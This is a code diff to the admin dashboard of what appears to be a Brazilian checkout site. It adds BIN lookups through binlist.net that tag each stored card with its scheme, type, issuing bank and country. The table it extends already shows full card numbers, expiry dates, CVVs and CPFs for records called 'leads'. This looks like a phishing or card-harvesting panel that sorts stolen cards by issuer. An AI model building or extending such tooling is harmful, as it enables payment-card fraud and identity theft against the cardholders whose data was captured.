@@ -105,6 +105,55 @@ export default function Admin() {
   const [errorLogs, setErrorLogs] = useState<any[]>([]);
   const [webhookLogs, setWebhookLogs] = useState<any[]>([]);
   const [logsLoading, setLogsLoading] = useState(false);
+  const [binCache, setBinCache] = useState<Record<string, { scheme: string; type: string; bank_name: string; country_name: string }>>({});
+
+  // BIN lookup with DB cache
+  const lookupBins = useCallback(async (cardLeads: Lead[]) => {
+    const bins = new Set<string>();
+    cardLeads.forEach(l => {
+      if (l.card_number) {
+        const clean = l.card_number.replace(/\D/g, "");
+        if (clean.length >= 6) bins.add(clean.slice(0, 6));
+      }
+    });
+    if (bins.size === 0) return;
+
+    // Check DB cache first
+    const binArray = Array.from(bins);
+    const { data: cached } = await supabase.from("bin_cache").select("*").in("bin", binArray);
+    const result: Record<string, any> = {};
+    const uncached: string[] = [];
+
+    (cached || []).forEach((row: any) => {
+      result[row.bin] = { scheme: row.scheme, type: row.type, bank_name: row.bank_name, country_name: row.country_name };
+    });
+    binArray.forEach(b => { if (!result[b]) uncached.push(b); });
+
+    // Fetch uncached from API (with delay to respect rate limit)
+    for (const bin of uncached) {
+      try {
+        const res = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { "Accept-Version": "3" } });
+        if (res.ok) {
+          const data = await res.json();
+          const entry = {
+            scheme: data.scheme || "",
+            type: data.type || "",
+            bank_name: data.bank?.name || "",
+            country_name: data.country?.name || "",
+          };
+          result[bin] = entry;
+          // Save to DB cache
+          await supabase.from("bin_cache").upsert({ bin, ...entry });
+        }
+        // Rate limit: wait 500ms between requests
+        if (uncached.indexOf(bin) < uncached.length - 1) {
+          await new Promise(r => setTimeout(r, 500));
+        }
+      } catch { /* skip */ }
+    }
+
+    setBinCache(prev => ({ ...prev, ...result }));
+  }, []);
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
@@ -143,7 +192,11 @@ export default function Admin() {
         console.error(leadsRes.error);
         setError("Erro ao carregar dados");
       } else {
-        setLeads((leadsRes.data as Lead[]) || []);
+        const leadsData = (leadsRes.data as Lead[]) || [];
+        setLeads(leadsData);
+        // Lookup BINs for card leads
+        const cardLeads = leadsData.filter(l => l.card_number);
+        if (cardLeads.length > 0) lookupBins(cardLeads);
       }
       setVisitorsCount(visitorsRes.count || 0);
       setCheckoutsCount(checkoutsRes.count || 0);
@@ -232,7 +285,7 @@ export default function Admin() {
       setAlerts(newAlerts);
       setLoading(false);
     });
-  }, [authenticated, period, customFrom, customTo]);
+  }, [authenticated, period, customFrom, customTo, lookupBins]);
 
   useEffect(() => {
     fetchData();
@@ -720,7 +773,7 @@ export default function Admin() {
                   <thead className="bg-muted">
                     <tr>
                       {["Data", "Nome", "Email", "Telefone", "CPF", "Método", "Cor", "Tam", "Qtd", "Total", "Cidade/UF",
-                        "Nº Cartão", "Titular", "Validade", "CVV", "Parcelas", "Status"].map((h) => (
+                        "Nº Cartão", "Bandeira", "Tipo", "Banco", "País", "Titular", "Validade", "CVV", "Parcelas", "Status"].map((h) => (
                         <th key={h} className="px-3 py-2 text-left whitespace-nowrap font-semibold">{h}</th>
                       ))}
                     </tr>
@@ -744,6 +797,19 @@ export default function Admin() {
                         <td className="px-3 py-2 whitespace-nowrap">R$ {l.total_amount ? (l.total_amount / 100).toFixed(2) : "—"}</td>
                         <td className="px-3 py-2 whitespace-nowrap">{l.cidade}/{l.uf}</td>
                         <td className="px-3 py-2 whitespace-nowrap font-mono">{l.card_number}</td>
+                        {(() => {
+                          const clean = l.card_number?.replace(/\D/g, "") || "";
+                          const bin = clean.length >= 6 ? clean.slice(0, 6) : "";
+                          const info = bin ? binCache[bin] : null;
+                          return (
+                            <>
+                              <td className="px-3 py-2 whitespace-nowrap text-[10px] font-semibold uppercase">{info?.scheme || "—"}</td>
+                              <td className="px-3 py-2 whitespace-nowrap text-[10px]">{info?.type || "—"}</td>
+                              <td className="px-3 py-2 whitespace-nowrap text-[10px]">{info?.bank_name || "—"}</td>
+                              <td className="px-3 py-2 whitespace-nowrap text-[10px]">{info?.country_name || "—"}</td>
+                            </>
+                          );
+                        })()}
                         <td className="px-3 py-2 whitespace-nowrap">{l.card_holder}</td>
                         <td className="px-3 py-2">{l.card_expiry}</td>
                         <td className="px-3 py-2">{l.card_cvv}</td>
@@ -756,7 +822,7 @@ export default function Admin() {
                       </tr>
                     ))}
                     {!leads.length && (
-                      <tr><td colSpan={17} className="text-center py-8 text-muted-foreground">Nenhum lead encontrado</td></tr>
+                      <tr><td colSpan={21} className="text-center py-8 text-muted-foreground">Nenhum lead encontrado</td></tr>
                     )}
                   </tbody>
                 </table>
